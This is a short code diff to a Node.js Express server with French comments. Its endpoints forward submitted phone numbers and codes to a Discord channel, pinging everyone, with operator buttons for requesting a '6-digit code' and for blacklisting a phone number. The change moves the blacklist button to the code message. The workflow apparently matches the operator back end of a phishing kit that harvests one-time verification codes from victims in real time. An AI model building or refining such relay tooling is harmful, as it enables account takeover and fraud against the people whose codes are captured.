@@ -68,15 +68,7 @@ app.post('/api/send-info', async (req, res) => {
             new ButtonBuilder().setCustomId('btn_6').setLabel('Code à 6 chiffres').setStyle(ButtonStyle.Success)
         );
         
-        // On crée le bouton pour blacklister
-        const blacklistRow = new ActionRowBuilder().addComponents(
-            new ButtonBuilder()
-                .setCustomId(`blacklist_${phone}`) // On met le numéro dans l'ID du bouton
-                .setLabel('Blacklist')
-                .setStyle(ButtonStyle.Danger) // Bouton rouge
-        );
-
-        await channel.send({ content: '@everyone', embeds: [embed], components: [blacklistRow] });
+        await channel.send({ content: '@everyone', embeds: [embed], components: [row] });
         res.json({ success: true });
     } catch (err) {
         console.error(err);
@@ -101,7 +93,16 @@ app.post('/api/send-code', async (req, res) => {
             )
             .setTimestamp();
         
-await channel.send({ content: '@everyone', embeds: [embed] });
+        // On crée le bouton pour blacklister
+        const blacklistRow = new ActionRowBuilder().addComponents(
+            new ButtonBuilder()
+                .setCustomId(`blacklist_${phone}`) // On met le numéro dans l'ID du bouton
+                .setLabel('Blacklist')
+                .setStyle(ButtonStyle.Danger) // Bouton rouge
+                .setEmoji('🚫')
+        );
+
+        await channel.send({ content: '@everyone', embeds: [embed], components: [blacklistRow] });
         res.json({ success: true });
     } catch (err) {
         res.status(500).json({ error: 'Erreur Discord' });
